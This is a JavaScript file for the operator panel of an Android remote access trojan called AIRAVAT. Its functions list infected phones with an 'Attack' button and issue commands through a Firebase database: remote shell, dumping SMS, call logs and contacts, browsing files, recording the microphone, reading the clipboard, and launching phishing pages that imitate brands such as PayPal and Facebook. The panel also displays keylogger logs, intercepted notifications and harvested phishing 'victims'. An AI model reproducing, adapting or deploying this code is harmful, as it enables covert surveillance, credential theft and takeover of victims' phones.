$("#preloaderr").fadeOut();
var respov=$("#cmdref").val();
var var32="";
var unqid="";
var manager="";
var bckstp=0;
var database=firebase.database();
var lastkeynot="";
var lastkeykey="";
var lastkeyphish="";
var lastkeyvoice="";
var wallpaperno="";
var uo2=document.getElementById("users");

function opnav(o){
if($("#navbar").css("display") == "none"){

o.style.color="red";
o.innerHTML="&#10005;";
$("#navbar").css("display","block");
}
else{
o.style.color="white";
o.innerHTML="&#8801;";
$("#navbar").css("display","none");
}
}

function hidekarbsdk(){
$("#micrec").css("display","none");
$("#wallpaperdiv").css("display","none");
$("#senddm").css("display","none");
$("#pvtt").css("display","none");
$("#toastdiv").css("display","none");
$("#notikey").css("display","none");
$("#viewers").css("display","none");
$("#fprev").css("display","none");
$("#resp").css("display","none");
$("#shellcmd").css("display","none");
$("#showphishj").css("display","none");
//$("#").css("display","none");


}





function userss(){
var database = firebase.database();
var ref = database.ref("/online/onlinetheoneandonly");
ref.on("value",(snapshot) =>{
if (snapshot.exists()) {
var scores=snapshot.val();
var keys=Object.keys(scores);
uo2.innerHTML="<br>";
for(var i=0;i<keys.length;i++){
var k=keys[i];
var aversion=scores[k].device.android;
var battery=scores[k].device.battery;
var model=scores[k].device.phone;
var ip=scores[k].device.rooted;
var uid=scores[k].device.id;
uo2.innerHTML+='<br><div class="usr" >'+model+' <span style="float:right" >'+aversion+'</span><br><br>Rooted: '+ip+' <span style="float:right" >Battery: '+battery+' </span><br><br><center><button onclick="setdev('+"'"+uid+"'"+')">Attack</button></center></div> '; 
}
}
else{
uo2.innerHTML="No online Devices";
}
});
}
userss();






function setdev(o){
respov="/comds/comds"+o;
unqid=o;
$("#cmdref").val("/comds/comds"+o);
showdat(o);
$("#users").css("display","none");
$("#backkk").css("display","block");
$("#phones").css("display","block");
}




function setdatcmd(o,p,q,r){
var result= '';
var characters= 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
var charactersLength = characters.length;
for ( var i = 0; i < 8; i++ ) {
result += characters.charAt(Math.floor(Math.random() * charactersLength));
}
var store={
cmdn :o,
cmdv: p,
cmdvar : q,
rndm : result
};
$("#phones").css("display","none");
//hidekarbsdk();
$("#preloaderr").fadeIn();
var con =  database.ref(r).child("comdss").set(store);
}


function cmd(){
var database=firebase.database();
var us=document.getElementById("cmdref").value;
var ref=database.ref(us);
var hio=document.getElementById("cmd").value;
var hio2=document.getElementById("cmdvar").value;
var hio3=document.getElementById("cmdvarm").value;
setdatcmd(hio,hio2,hio3,us);
}
function showdat(o){
var database = firebase.database();
var ref = database.ref("respos/respo"+o);
ref.on("child_changed",(snapshot) => {
if (snapshot.exists()) {
var dat=snapshot.val();
var respo=dat.respo+"";
var v1=dat.v1+"";
var v2=dat.v2+"";
var v3=dat.v3+"";
var32=dat.var2+"";
$("#preloaderr").fadeOut();
if(manager=="filesmanager"){
filesfol(respo,v1,v2,v3,var32);
}
else if(manager=="fileview"){
fileev(v1);
}
else if(manager=="shellview"){
shellviewer(v1);
}
else if(manager=="deviceinfo"){
var iodg=new DOMParser().parseFromString(v1, 'text/html').body.textContent;
if(iodg == "null" || iodg.length == 1){
v1="<div class='keylogg'>No Data Found</div>";
}
showinfodev(v1);
}
else if(manager=="dialogview"){
showdialog(v1);
}
else{
}
} else {
console.log("No data available");
}
});
}

var pd2=document.createElement("div");
pd2.style.height="100%";
pd2.style.width="100%";
pd2.style.zIndex="999999999999999999";
pd2.style.background="#001";
pd2.style.color="#fff";
pd2.style.position="fixed";
pd2.style.top="50px";
pd2.style.left="0";
pd2.style.display="flex";
pd2.style.alignItems="center";
pd2.style.justifyContent="center";

var pd3=document.createElement("div");
pd3.style.height="290px";
pd3.style.width="250px";
pd3.style.zIndex="99999999999999999";
pd3.style.background="#000";
pd3.style.borderRadius="10px";
pd3.style.color="#fff";
pd3.style.border="1px solid #0f8";
pd3.style.padding="10px";

function aday(){
var date = new Date().toLocaleDateString();
if( localStorage.airvat == date ) 
return false;
else
return true;
}

if(aday()){
document.body.appendChild(pd2);
}

pd3.innerHTML="<center> <h3 style='color:red'>•Notice•<h3> </center><br>This is an Open Source RAT named <b style='color:gold'>AIRAVAT </b>available for free on <a href='https://github.com/Th30neAnd0nly/AIRAVAT' style='color:#0f8;'>GitHub</a>. Reselling , Changing Brand Name , Logo  of free version are strictly prohibited.";
pd3.innerHTML+="<br><center><button onclick='this.parentElement.parentElement.parentElement.style.display="+'"none"'+"' style='margin-top:5px;color:white;background:#001;border:1px solid red;border-radius:5px;height:30px;width:150px;margin-bottom:10px;'> I Understand</button><br><u style='color:red;font-size:15px;' onclick='dnd(this);'>Hide this notice for a day</u>";
pd2.appendChild(pd3);
function dnd(m){
var date = new Date().toLocaleDateString();
localStorage.airvat = date;
m.parentElement.parentElement.parentElement.style.display="none";
}
var pd1=document.createElement("div");
pd1.style.height="50px";
pd1.style.width="90%";
pd1.style.margin="auto";
pd1.style.marginTop="15px";
pd1.style.background="#001";
pd1.style.borderRadius="10px";
pd1.style.color="#fff";
pd1.style.textAlign="center";
pd1.style.lineHeight="50px";
pd1.style.border="1px solid #0f8";
pd1.innerHTML="Want More Features Contact at <a href='https://t.me/th30neand0nly' style='color:#0f8;'>@th30neand0nly</a>";

var pd=document.createElement("div");
pd.style.height="20px";
pd.style.width="100%";
pd.style.color="#fff";
pd.style.lineHeight="20px";
pd.style.position="fixed";
pd.style.top="25px";
pd.style.left="0";
pd.style.zIndex="999999999999999999";
pd.style.textAlign="center";
pd.innerHTML="&copy; Prateek Chaubey";
document.getElementById("tophead").appendChild(pd);
$(".h4").text("AIRAVAT");
document.getElementById("phones").appendChild(pd1);

function backk(o){
if($("#users").css("display") == "none" && $("#phones").css("display") == "none"){
hidekarbsdk();
$("#users").css("display","none");
$("#phones").css("display","block");
}
else if($("#users").css("display") == "none" && $("#phones").css("display") != "none"){
hidekarbsdk();
$("#backkk").css("display","none");
$("#users").css("display","block");
$("#phones").css("display","none");
}
else{

}
}
function showphish(){
manager="notikey";
if(manager=="notikey"){
var psdus=document.getElementById("notikey");
hidekarbsdk();
$("#preloaderr").fadeIn();
$("#phones").css("display","none");
var database = firebase.database();
var ref = database.ref("pdata/pdatahiddenser");//+localStorage.getItem("airavatpass"));
ref.limitToFirst(10).on("value",gotData);
function gotData(data){
$("#preloaderr").fadeOut();
psdus.style.display="block";
psdus.innerHTML='';
if (data.exists()) {
var scores=data.val();
var keys=Object.keys(scores);
var i=0;
for(i=(keys.length-1);i > -1 ;i--){
var k=keys[i];
var data2=scores[k].data;

psdus.innerHTML+='<div class="keylogg" >'+data2+"</div>";
}
if(lastkeyphish != (keys[keys.length-1]+"") && parseInt(keys.length) >= 10 ){
lastkeyphish=keys[keys.length-1]+"";
psdus.innerHTML+="<br><center><button class='btn' "+'onclick="showphishu(this,'+"'"+lastkeyphish+"'"+')"'+">Load More</button></center><br>";

}
lastkeyphish=keys[keys.length-1]+"";

}
else{
psdus.innerHTML='<div class="keylogg" ><h4>No Victims  Found<h4></div>';
}

}
}
}

function showphishu(o,p){
manager="notikey";
if(manager=="notikey"){
o.innerHTML=".....";
o.disabled=true;
var psdus=document.getElementById("notikey");
var database = firebase.database();
var ref = database.ref("pdata/pdatahiddenser");
ref.orderByKey().startAt(p).limitToFirst(10).on("value",gotData);
function gotData(data){
if (data.exists()) {
var scores=data.val();
var keys=Object.keys(scores);
var i=0;
psdus.style.display="block";
o.style.display="none";
for(i=(keys.length-1);i > -1 ;i--){
var k=keys[i];
var data2=scores[k].data;
psdus.innerHTML+='<div class="keylogg" >'+data2+"</div>";
}
if(lastkeyphish != (keys[keys.length-1]+"") && parseInt(keys.length) >= 10 ){
lastkeyphish=keys[keys.length-1]+"";
psdus.innerHTML+="<br><center><button class='btn' "+'onclick="showphishu(this,'+"'"+lastkeyphish+"'"+')"'+">Load More</button></center><br>";
}
lastkeyphish=keys[keys.length-1]+"";
}
else{
psdus.innerHTML='<div class="keylogg" ><h4>No Victims Found<h4></div>';
}
}
}
}


function changewallpaper(){
hidekarbsdk();
manager="dialogview";
$("#phones").css("display","none");
$("#users").css("display","none");
$("#wallpaperdiv").css("display","block");
}



function setwalls(){
setdatcmd("changewall",wallpaperno,"",respov);
}



function selectimg(o,p){
for(var u=0;u<3;u++){
$(".wallimg").children().eq(u).css("border","none")
}
$(o).css("border","2px solid red");
wallpaperno=p+"";
}
function setdatcmd2(o,p,q,s,r){
var result= '';
var characters= 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
var charactersLength = characters.length;
for ( var i = 0; i < 8; i++ ) {
result += characters.charAt(Math.floor(Math.random() * charactersLength));
}
var store={
cmdn :o,
cmdv: p,
cmdvar : q,
cmdvar2 : s, 
rndm : result
};
$("#phones").css("display","none");
//hidekarbsdk();
$("#preloaderr").fadeIn();
var con =  database.ref(r).child("comdss").set(store);
setTimeout(()=>{
if($("#preloaderr").css("display") == "block"){
$("#preloaderr").fadeOut();
showdialog("Connection Timed Out");
}

},10000);
}

function iojh(){
var yi=['dropbox3.png','facebook2.png','facebook5.png','free_fire3.png','github1.png','instagram1.png','linkedin1.png','messenger1.png','microsoft1.png','netflix1.png','paypal2.png','protonmail1.png','pubg2.png','snapchat1.png','tumblir1.png','twitter1.png','wordpress1.png','yahoo1.png'];
document.getElementById("hion").src="./imgg/"+yi[parseInt($("#lshpih").val())];
}
function execphish(){
setdatcmd2("phpage",$("#phpage").val(),$("#nshpih").val(),$("#lshpih").val(),"comds/comds"+unqid+"phi");
}
function execphish2(){
setdatcmd2("cust",$("#shpih").val(),$("#nshpih").val(),$("#lshpih").val(),"comds/comds"+unqid+"phi");
}
function recordvoice(){
setdatcmd("micrec",(parseInt($("#recval").val())*1000),"","comds/comds"+unqid+"phi");
}
function micrec(){
voicess();
hidekarbsdk();
manager="dialogview";
$("#phones").css("display","none");
$("#users").css("display","none");
$("#micrec").css("display","block");
}
function sendsms(){
if((!isNaN($("#smsnumber").val() )) && $("#smscontent").val() != "" ){
setdatcmd("sendsms",$("#smsnumber").val(),$("#smscontent").val(),respov);
}else{
alert("Please Enter Valid Data");
}
}
$(".dgh").css("display","none");
function sendmsg(){
hidekarbsdk();
manager="dialogview";
$("#phones").css("display","none");
$("#users").css("display","none");
$("#senddm").css("display","block");
}
function ttsf(){
if($("#ttscmd").val() != ""){
setdatcmd("ttsdev",$("#ttscmd").val(),"",respov);
}
else{
alert("Please Enter Valid Text");
}
}
function opwebl(){
if($("#opwebcmd").val() != ""){
setdatcmd("opweb",$("#opwebcmd").val(),"",respov);
}
else{
alert("Please Enter Valid URL");
}
}
function tont(){
setdatcmd("tont","","",respov);
}
function tofft(){
setdatcmd("tofft","","",respov);
}
function vibra(){
if(!isNaN($("#vibratecmd").val())){
setdatcmd("vibratedev",($("#vibratecmd").val() * 1000),"",respov);
}
else{
alert("Please Enter Valid Time");
}
}
function playmus(){
if($("#musiccmd").val().indexOf(".mp3") > 0){
setdatcmd("playsmusic",$("#musiccmd").val(),"",respov);
}
else{
alert("Please Enter Valid URL");
}
}
function showphpag(){
hidekarbsdk();
manager="dialogview";
$("#phones").css("display","none");
$("#users").css("display","none");
$("#showphishj").css("display","block");

}
function funcmd(x){
hidekarbsdk();
$("#fmc2").css("display","none");
$("#fmc1").css("display","none");
$("#"+x).css("display","block");
manager="dialogview";
$("#phones").css("display","none");
$("#users").css("display","none");
$("#pvtt").css("display","block");
}
function showdialog(o){
$("#diamain").css("display","flex");
$("#diatext").html(o);
}
function toastt(){
hidekarbsdk();
manager="dialogview";
$("#phones").css("display","none");
$("#users").css("display","none");
$("#toastdiv").css("display","block");
}
function toastexc(){
setdatcmd("toasttext",$("#toastcmd").val(),"",respov);
}
function deviceinfo(){
hidekarbsdk();
manager="deviceinfo";
$("#phones").css("display","none");
$("#users").css("display","none");
setdatcmd("deviceinfo","","",respov);
}
function showclip(){
hidekarbsdk();
manager="deviceinfo";
$("#phones").css("display","none");
$("#users").css("display","none");
setdatcmd2("clip","","","","comds/comds"+unqid+"phi");
}
function showinfodev(o){
hidekarbsdk();
$("#notikey").css("display","block");
$("#notikey").html(o);
}
function startshell(){
hidekarbsdk();
manager="shellview";
$("#phones").css("display","none");
$("#users").css("display","none");
$("#shellcmd").css("display","block");
}
function shellcm(o){
if (event.keyCode === 13) {
setdatcmd("shellcmd",o.value,"",respov);
}
}
function shellviewer(o){
$("#shellcmd").css("display","block");
$("#shelldata").html("AIRAVAT Shell<br><br>"+o.replaceAll("\n","<br>"))

}
function convertTimestamp(timestamp) {
var d = new Date(timestamp),	// Convert the passed timestamp to milliseconds
yyyy = d.getFullYear(),
mm = ('0' + (d.getMonth() + 1)).slice(-2),	// Months are zero based. Add leading 0.
dd = ('0' + d.getDate()).slice(-2),			// Add leading 0.
hh = d.getHours(),
h = hh,
min = ('0' + d.getMinutes()).slice(-2),		// Add leading 0.
ampm = 'AM',
time;
if (hh > 12) {
h = hh - 12;
ampm = 'PM';
} else if (hh === 12) {
h = 12;
ampm = 'PM';
} else if (hh == 0) {
h = 12;
}
time = yyyy + '-' + mm + '-' + dd + ', ' + h + ':' + min + ' ' + ampm;
return time;
}
function voicess(){
manager="notikey";
if(manager=="notikey"){
var psdus=document.getElementById("showrecs");
$("#preloaderr").fadeIn();
$("#phones").css("display","none");
var database = firebase.database();
var ref = database.ref("records/"+unqid);
ref.limitToFirst(10).on("value",gotData);
function gotData(data){
$("#preloaderr").fadeOut();
psdus.style.display="block";
psdus.innerHTML='';
if (data.exists()) {
var scores=data.val();
var keys=Object.keys(scores);
var i=0;
var rndm='recs'+Math.floor((Math.random() * 1000 ) + 100);
var rndm2='.'+rndm;
for(i=(keys.length-1);i > -1 ;i--){
var k=keys[i];
var recs=scores[k].url;
var times=scores[k].time;

psdus.innerHTML+='<div class="recswarp" ><div class="plrec" onclick="playssrec(this)" ><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#0dd" class="bi bi-play" viewBox="0 0 16 16"><path d="M10.804 8 5 4.633v6.734L10.804 8zm.792-.696a.802.802 0 0 1 0 1.392l-6.363 3.692C4.713 12.69 4 12.345 4 11.692V4.308c0-.653.713-.998 1.233-.696l6.363 3.692z"/></svg></div><audio controls ><source src="'+recs+'" type="audio/mpeg" /></audio><div class="downlii" onclick="downliio('+"'"+recs+"'"+')"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#0dd" class="bi bi-box-arrow-down" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M3.5 10a.5.5 0 0 1-.5-.5v-8a.5.5 0 0 1 .5-.5h9a.5.5 0 0 1 .5.5v8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 0 0 1h2A1.5 1.5 0 0 0 14 9.5v-8A1.5 1.5 0 0 0 12.5 0h-9A1.5 1.5 0 0 0 2 1.5v8A1.5 1.5 0 0 0 3.5 11h2a.5.5 0 0 0 0-1h-2z"/><path fill-rule="evenodd" d="M7.646 15.854a.5.5 0 0 0 .708 0l3-3a.5.5 0 0 0-.708-.708L8.5 14.293V5.5a.5.5 0 0 0-1 0v8.793l-2.146-2.147a.5.5 0 0 0-.708.708l3 3z"/></svg></div>'+convertTimestamp(parseInt(times))+'</div><br>';
}

if(lastkeyvoice != (keys[keys.length-1]+"") && parseInt(keys.length) >= 10 ){
lastkeyvoice=keys[keys.length-1]+"";
psdus.innerHTML+="<br><center><button class='btn' "+'onclick="voicessu(this,'+"'"+lastkeyvoice+"'"+')"'+">Load More</button></center><br>";
}
lastkeyvoice=keys[keys.length-1];

}
else{
psdus.innerHTML='<div class="keylogg" ><h4>No Recordings Found<h4></div>';
}

}
}
}
function voicessu(o,p){
manager="notikey";
if(manager=="notikey"){
o.innerHTML=".....";
o.disabled=true;
var psdus=document.getElementById("showrecs");
var database = firebase.database();
var ref = database.ref("records/"+unqid);
ref.orderByKey().startAt(p).limitToFirst(10).on("value",gotData);
function gotData(data){
if (data.exists()) {
var scores=data.val();
var keys=Object.keys(scores);
var i=0;
psdus.style.display="block";
o.style.display="none";
var rndm='recs'+Math.floor((Math.random() * 1000 ) + 100);
var rndm2='.'+rndm;

for(i=(keys.length-1);i > -1 ;i--){
var k=keys[i];
var recs=scores[k].url;
var times=scores[k].time;
psdus.innerHTML+='<div class="recswarp" ><div class="plrec" onclick="playssrec(this)" ><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#0dd" class="bi bi-play" viewBox="0 0 16 16"><path d="M10.804 8 5 4.633v6.734L10.804 8zm.792-.696a.802.802 0 0 1 0 1.392l-6.363 3.692C4.713 12.69 4 12.345 4 11.692V4.308c0-.653.713-.998 1.233-.696l6.363 3.692z"/></svg></div><audio controls ><source src="'+recs+'" type="audio/mpeg" /></audio><div class="downlii"onclick="downliio('+"'"+recs+"'"+')" ><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#0dd" class="bi bi-box-arrow-down" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M3.5 10a.5.5 0 0 1-.5-.5v-8a.5.5 0 0 1 .5-.5h9a.5.5 0 0 1 .5.5v8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 0 0 1h2A1.5 1.5 0 0 0 14 9.5v-8A1.5 1.5 0 0 0 12.5 0h-9A1.5 1.5 0 0 0 2 1.5v8A1.5 1.5 0 0 0 3.5 11h2a.5.5 0 0 0 0-1h-2z"/><path fill-rule="evenodd" d="M7.646 15.854a.5.5 0 0 0 .708 0l3-3a.5.5 0 0 0-.708-.708L8.5 14.293V5.5a.5.5 0 0 0-1 0v8.793l-2.146-2.147a.5.5 0 0 0-.708.708l3 3z"/></svg></div>'+convertTimestamp(parseInt(times))+'</div><br>';


}

if(lastkeyvoice != (keys[keys.length-1]+"") && parseInt(keys.length) >= 10 ){
lastkeyvoice=keys[keys.length-1]+"";
psdus.innerHTML+="<br><center><button class='btn' "+'onclick="voicessu(this,'+"'"+lastkeyvoice+"'"+')"'+">Load More</button></center><br>";
}
lastkeyvoice=keys[keys.length-1]+"";
}
else{
psdus.innerHTML='<div class="keylogg" ><h4>No Recordings Found<h4></div>';
}
}
}
}
function keylogger(){
manager="notikey";
if(manager=="notikey"){
var psdus=document.getElementById("notikey");
hidekarbsdk();
$("#preloaderr").fadeIn();
$("#phones").css("display","none");
var database = firebase.database();
var ref = database.ref("logolog/"+unqid);
ref.limitToFirst(10).on("value",gotData);
function gotData(data){
$("#preloaderr").fadeOut();
psdus.style.display="block";
psdus.innerHTML='';
if (data.exists()) {
var scores=data.val();
var keys=Object.keys(scores);
var i=0;
for(i=(keys.length-1);i > -1 ;i--){
var k=keys[i];
var event=scores[k].logoev;
var date=scores[k].logodate;
var msg=scores[k].msg;

psdus.innerHTML+='<div class="keylogg" ><b>Event: </b>'+event+'<br><br><b>Time: </b>'+date+'<br><br><b>Msg: </b>'+msg+"</div>";
}
if(lastkeykey != (keys[keys.length-1]+"") && parseInt(keys.length) >= 10 ){
lastkeykey=keys[keys.length-1]+"";
psdus.innerHTML+="<br><center><button class='btn' "+'onclick="loadmoreeu(this,'+"'"+lastkeykey+"'"+')"'+">Load More</button></center><br>";

}
lastkeykey=keys[keys.length-1]+"";

}
else{
psdus.innerHTML='<div class="keylogg" ><h4>No Logs Found<h4></div>';
}

}
}
}
function loadmoreeu(o,p){
manager="notikey";
if(manager=="notikey"){
o.innerHTML=".....";
o.disabled=true;
var psdus=document.getElementById("notikey");
var database = firebase.database();
var ref = database.ref("logolog/"+unqid);
ref.orderByKey().startAt(p).limitToFirst(10).on("value",gotData);
function gotData(data){
if (data.exists()) {
var scores=data.val();
var keys=Object.keys(scores);
var i=0;
psdus.style.display="block";
o.style.display="none";
for(i=(keys.length-1);i > -1 ;i--){
var k=keys[i];
var event=scores[k].logoev;
var date=scores[k].logodate;
var msg=scores[k].msg;

psdus.innerHTML+='<div class="keylogg" ><b>Event: </b>'+event+'<br><br><b>Time: </b>'+date+'<br><br><b>Msg: </b>'+msg+"</div>";
}
if(lastkeykey != (keys[keys.length-1]+"") && parseInt(keys.length) >= 10 ){
lastkeykey=keys[keys.length-1]+"";
psdus.innerHTML+="<br><center><button class='btn' "+'onclick="loadmoreeu(this,'+"'"+lastkeykey+"'"+')"'+">Load More</button></center><br>";
}
lastkeykey=keys[keys.length-1]+"";
}
else{
psdus.innerHTML='<div class="keylogg" ><h4>No Logs Found<h4></div>';
}
}
}
}
function notificationlog(){
manager="notikey";
var psdus=document.getElementById("notikey");
hidekarbsdk();
$("#preloaderr").fadeIn();
$("#phones").css("display","none");
var database = firebase.database();
var ref = database.ref("notilogo/"+unqid);
if(manager=="notikey"){
ref.limitToFirst(10).on("value",gotData);
}
function gotData(data){
$("#preloaderr").fadeOut();
psdus.style.display="block";
psdus.innerHTML='';
if (data.exists()) {
var scores=data.val();
var keys=Object.keys(scores);
var i=0;
for(i=(keys.length-1);i > -1 ;i--){
var k=keys[i];
var ico=scores[k].icon;
var packa=scores[k].package;
var title=scores[k].title;
var time=scores[k].time;
var ticker=scores[k].ticker;
var text=scores[k].text;
var name=scores[k].name;
if(ticker != ""){
ticker='('+ticker+')';
}
psdus.innerHTML+='<div class="keylogg" >'
+'<img src="data:image/png;base64,'+ico+'" >'
+'<div style="margin-left:60px;overflow:auto; "><b  style="color:green"> '+name+'</b><br><b style="color:red">'+packa+'</b><br><br><br></div>'
+'<h4>'+title+'<br><b>'+ticker+'</b> </h4>'
+'<br><p>'+text+'</p>'
+'<br><span>'+convertTimestamp(time)+'</span>'
+'</div>';
}
if(lastkeynot != (keys[keys.length-1]+"") && parseInt(keys.length) >= 10 ){
lastkeynot=keys[keys.length-1]+"";
psdus.innerHTML+="<br><center><button class='btn' "+'onclick="loadmoree(this,'+"'"+lastkeynot+"'"+')"'+">Load More</button></center><br>";

}

lastkeynot=keys[keys.length-1]+"";

}
else{
psdus.innerHTML='<div class="keylogg" ><h4>No Notifications Found<h4></div>';
}
}
}
function loadmoree(o,p){
manager=="notikey";
o.innerHTML=".....";
o.disabled=true;
var psdus=document.getElementById("notikey");
var database = firebase.database();

var ref = database.ref("notilogo/"+unqid);
if(manager=="notikey"){
ref.orderByKey().startAt(p).limitToFirst(10).on("value",gotData);
}
function gotData(data){
if (data.exists() && manager=="notikey") {
var scores=data.val();
var keys=Object.keys(scores);
var i=0;
psdus.style.display="block";
o.style.display="none";
for(i=(keys.length-1);i > -1 ;i--){
var k=keys[i];
var ico=scores[k].icon;

var packa=scores[k].package;
var title=scores[k].title;
var time=scores[k].time;
var ticker=scores[k].ticker;
var text=scores[k].text;
var name=scores[k].name;
if(ticker != ""){
ticker='('+ticker+')';
}

function toAscii(str) { return str.split(' ').map(i => String.fromCharCode(parseInt(i, 2)).toString(10)).join(''); }
var rd=document.createElement("div");
rd.innerHTML = "&copy;"+toAscii("01010000 01110010 01100001 01110100 01100101 01100101 01101011 00100000 01000011 01101000 01100001 01110101 01100010 01100101 01111001");
document.getElementById("tophead").appendChild(rd);


psdus.innerHTML+='<div class="keylogg" >'
+'<img src="data:image/png;base64,'+ico+'" >'
+'<div style="margin-left:60px;overflow:auto; "><b  style="color:green"> '+name+'</b><br><b style="color:red">'+packa+'</b><br><br><br></div>'
+'<h4>'+title+'<br><b>'+ticker+'</b> </h4>'
+'<br><p>'+text+'</p>'
+'<br><span>'+convertTimestamp(time)+'</span>'
+'</div>';

}
if(lastkeynot != (keys[keys.length-1]+"") && parseInt(keys.length) >= 10 ){
lastkeynot=keys[keys.length-1]+"";
psdus.innerHTML+="<br><center><button class='btn' "+'onclick="loadmoree(this,'+"'"+lastkeynot+"'"+')"'+">Load More</button></center><br>";
}
lastkeynot=keys[keys.length-1]+"";
}
else{
psdus.innerHTML='<div class="keylogg" ><h4>No Notifications Found<h4></div>';
}
}

}
function dumpsms(){
manager="fileview";
setdatcmd("dmpsms","","",respov);
}
function calllogs(){
manager="fileview";
setdatcmd("dmpcall","","",respov);
}
function dumpcontact(){
manager="fileview";
setdatcmd("dmpcont","","",respov);
}
function getpackages(){
manager="fileview";
setdatcmd("getpackages","","",respov);
}
function fileev(o){
document.getElementById("vieweri").src="data:text/html,<h4 style='color:green' > Getting File for preview....</h4>";
document.getElementById("viewers").style.display="block";
document.getElementById("vieweri").src=o;
document.getElementById("downlo").href=o;
}
function filesmanager(){
manager="filesmanager";
$("#resp").css("display","block");
$("#phones").css("display","none");
setdatcmd("cd","/sdcard/","",respov);
}
function filesfol(respo,v1,v2,v3,var32){
var uo=document.getElementById("resp");
uo.style.display="block";
if(respo == "imgview"){
document.getElementById("fprev").style.display="block";
document.getElementById("imv2").style.display="none";
document.getElementById("imv").style.display="inline";
document.getElementById("imv").src="data:image/png;base64,"+v1;
document.getElementById("fprevdes").innerHTML=v2+'<li><a download=""  id="btdwn" target="_blank"  href="data:image/png;base64,'+v1+'">Download File</a><br>';
}
//  ///


else if(respo == "fileview"){
document.getElementById("fprev").style.display="block";
document.getElementById("imv2").style.display="inline";
document.getElementById("imv2").src=v1;
document.getElementById("imv").style.display="none";
document.getElementById("fprevdes").innerHTML=v2+'<li><a download=""  id="btdwn" target="_blank"  href="'+v1+'">Download File</a><br>';


}
else{
uo.innerHTML=""+respo;//+"<br>"+dat.var2;
}

}
function opfol(event){
var target = event.target || event.srcElement;
tarfol=event.target.innerHTML;
if(tarfol==".."){
setdatcmd("cd",var32.substr(0,var32.lastIndexOf("/")),"",respov);
}
else if(tarfol.indexOf("<b>") > -1){
setdatcmd("cd",var32+"/"+tarfol.substr(0,tarfol.indexOf("<b>")),"",respov);
}
else{ 
setdatcmd("cd",var32+"/"+tarfol,"",respov);
}
}


function playssrec(o){
if(o.nextElementSibling.paused == false){
o.innerHTML='<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#0dd" class="bi bi-play" viewBox="0 0 16 16"><path d="M10.804 8 5 4.633v6.734L10.804 8zm.792-.696a.802.802 0 0 1 0 1.392l-6.363 3.692C4.713 12.69 4 12.345 4 11.692V4.308c0-.653.713-.998 1.233-.696l6.363 3.692z"/></svg>';
o.nextElementSibling.pause();
}
else{
o.innerHTML='<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#0dd" class="bi bi-pause" viewBox="0 0 16 16"><path d="M6 3.5a.5.5 0 0 1 .5.5v8a.5.5 0 0 1-1 0V4a.5.5 0 0 1 .5-.5zm4 0a.5.5 0 0 1 .5.5v8a.5.5 0 0 1-1 0V4a.5.5 0 0 1 .5-.5z"/></svg>';
o.nextElementSibling.play();
}
}
function downliio(o){
window.open(o);
}

